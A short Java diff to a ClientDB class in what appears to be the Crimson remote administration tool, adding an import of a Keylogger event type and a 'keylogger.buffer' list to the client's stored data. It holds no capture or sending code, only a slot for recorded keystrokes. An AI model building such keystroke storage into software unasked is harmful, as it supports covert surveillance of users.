@@ -20,6 +20,7 @@ package com.subterranean_security.crimson.core.storage;
 import java.io.File;
 import java.util.ArrayList;
 
+import com.subterranean_security.crimson.core.proto.Keylogger.EV_KEvent;
 import com.subterranean_security.crimson.core.util.CUtil;
 
 public class ClientDB extends Database {
@@ -45,6 +46,8 @@ public class ClientDB extends Database {
 
 		this.storeObject("login-times", new ArrayList<Long>());
 		this.storeObject("login-ips", new ArrayList<String>());
+
+		this.storeObject("keylogger.buffer", new MemList<EV_KEvent>());
 		super.softReset();
 	}
 
